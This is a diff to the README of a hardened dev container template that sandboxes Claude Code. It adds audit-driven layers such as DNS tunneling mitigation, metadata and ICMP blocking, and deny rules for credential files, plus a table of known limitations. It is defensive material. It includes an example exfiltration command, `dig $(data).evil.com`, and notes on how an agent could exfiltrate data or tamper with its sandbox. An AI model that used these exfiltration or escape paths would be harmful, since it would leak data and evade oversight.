@@ -55,26 +55,47 @@ A hardened, production-ready dev container template that gives your team:
 
 ## Security layers
 
-This template implements defence in depth with 8 security layers, drawing on patterns proven by the community:
+This template implements defence in depth with multiple security layers, drawing on patterns proven by the community and hardened after a formal security audit:
 
 | Layer | What it does | Source |
 |-------|-------------|--------|
 | **Non-root user** | Claude Code runs as `developer`, not `root`. Rejects `--dangerously-skip-permissions` as root. | [Anthropic official](https://github.com/anthropics/claude-code/tree/main/.devcontainer) |
 | **Filesystem sandboxing** | Only `/workspace` is bind-mounted. Claude cannot modify host system files. | Anthropic official |
 | **Read-only .devcontainer** | `.devcontainer/` is mounted read-only inside the container, preventing Claude from modifying its own sandbox config. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) |
-| **Deny Read(.devcontainer/**)** | Even if the mount were writable, managed settings deny Claude from reading sandbox configs. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) |
+| **Deny rules (managed settings)** | Managed settings deny Claude from reading/editing `.devcontainer/**`, `.env*`, `*.pem`, `*credentials*`, `.claude/settings.json`, `.git/hooks/**`, `.github/workflows/**`. | [trailofbits](https://github.com/trailofbits/claude-code-devcontainer), security audit |
+| **Bypass mode disabled** | `disableBypassPermissionsMode: "disable"` prevents `--dangerously-skip-permissions` from nullifying all deny rules. | Security audit |
 | **Cap-drop ALL + selective add** | All Linux capabilities dropped, only `NET_ADMIN` and `NET_RAW` added back (for firewall). `no-new-privileges` prevents privilege escalation. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), [centminmod](https://github.com/centminmod/claude-code-devcontainers) |
-| **Resource limits** | `pids-limit=256`, `memory=8g` prevent fork bombs and OOM. | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox) |
+| **Resource limits** | `pids-limit=256`, `memory=8g`, `ulimit nofile=1024:4096`, `ulimit core=0` (no core dumps). | [FoamoftheSea](https://github.com/FoamoftheSea/claude-code-sandbox), security audit |
+| **DNS tunneling mitigation** | DNS restricted to Docker's embedded resolver at `127.0.0.11` only. Prevents exfiltration via `dig $(data).evil.com`. | Security audit |
+| **Cloud metadata blocking** | Explicit REJECT rules for `169.254.169.254` and `169.254.169.253` (AWS/Azure/GCP metadata). | Security audit |
+| **Host network restricted** | Only the Docker gateway IP is allowed, not the entire `/24` subnet. Prevents port-scanning host services. | Security audit |
+| **ICMP blocking** | ICMP packets rejected to prevent ICMP tunneling via `NET_RAW` capability. | Security audit |
+| **IPv6 disabled** | IPv6 disabled via sysctl + `ip6tables DROP`. Prevents bypassing IPv4 firewall rules entirely. | Security audit |
+| **Firewall idempotency** | Lock file prevents re-running firewall script, eliminating the flush-and-rebuild race window. | Security audit |
 | **Network egress firewall** | Default-deny iptables. Only `api.anthropic.com`, GitHub, and configured domains reachable. | [Anthropic official](https://github.com/anthropics/claude-code/blob/main/.devcontainer/init-firewall.sh) |
-| **Bun supply chain hardening** | Bun ignores lifecycle scripts by default (unlike npm). No postinstall code execution unless explicitly trusted. | [Bun docs](https://bun.sh/docs/cli/install#lifecycle-scripts), inspired by [trailofbits](https://github.com/trailofbits/claude-code-devcontainer) |
+| **Bun supply chain hardening** | Bun ignores lifecycle scripts by default (unlike npm). No postinstall code execution unless explicitly trusted. | [Bun docs](https://bun.sh/docs/cli/install#lifecycle-scripts) |
 | **Scoped sudoers** | Only firewall and volume-ownership scripts can run as root. No broad `NOPASSWD:ALL`. | Production pattern |
-| **DNS over TCP** | Firewall allows DNS on both UDP and TCP port 53. Fixes truncated response failures in Docker's embedded DNS. | Production bugfix |
 | **Managed settings** | `/etc/claude-code/managed-settings.json` enforces org policy at highest precedence. | [Anthropic docs](https://code.claude.com/docs/en/devcontainer#enforce-organization-policy) |
 | **No host secrets** | `~/.ssh`, `~/.aws`, `docker.sock` are never mounted. Use SSH agent forwarding or scoped tokens. | All community repos |
 
 ### Why no SYS_ADMIN?
 
 Trail of Bits' `check_no_sys_admin()` explicitly blocks the `SYS_ADMIN` capability because it allows `mount()` inside the container, defeating the read-only `.devcontainer` mount. This template follows the same principle by using `--cap-drop=ALL`.
+
+### Known limitations
+
+These are inherent to the iptables-based firewall architecture. For stronger guarantees, consider a proxy-based approach (see [FoamoftheSea's Squid setup](https://github.com/FoamoftheSea/claude-code-sandbox)).
+
+| Limitation | Risk | Mitigation |
+|-----------|------|------------|
+| **DNS rebinding / stale IPs** | Domains are resolved to IPs at startup and never refreshed. CDN IPs rotate, and GitHub CIDRs are broad. | Use a DNS-aware proxy (Squid + SNI filtering) for production. |
+| **GitHub CIDR aggregation** | The `aggregate` tool merges CIDRs into broader supernets, potentially allowing non-GitHub IPs within those ranges. | Remove `aggregate` and use raw CIDRs if your ipset supports the entry count. |
+| **Persistent volume poisoning** | `node_modules` and `.bun` volumes persist across sessions. A compromised session could plant malicious code. | Make these volumes ephemeral, or verify `bun.lockb` integrity at startup. |
+| **Base image not pinned by digest** | `debian:bookworm-slim` tag is mutable. | Pin by digest for production: `FROM debian:bookworm-slim@sha256:<digest>`. |
+| **Build-time remote scripts** | `bun.sh/install` and `zsh-in-docker` are piped from the network without checksum verification. | Vendor scripts into the repo, or use multi-stage builds with verification. |
+| **No disk quota** | Docker volumes have no size limits. Claude can fill disk by writing to persistent volumes. | Use `--storage-opt size=10G` (requires overlay2 + xfs) or tmpfs with size limits. |
+| **No seccomp/AppArmor profile** | Default Docker seccomp profile applies, but a tighter custom profile could further reduce syscall attack surface. | Add `--security-opt=seccomp=<profile>.json` for high-security deployments. |
+| **Telemetry domains as exfil vectors** | `sentry.io` accepts arbitrary JSON payloads and could be used for data exfiltration. | Set `CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1` and remove telemetry domains from the firewall. |
 
 ## Customization guide
 
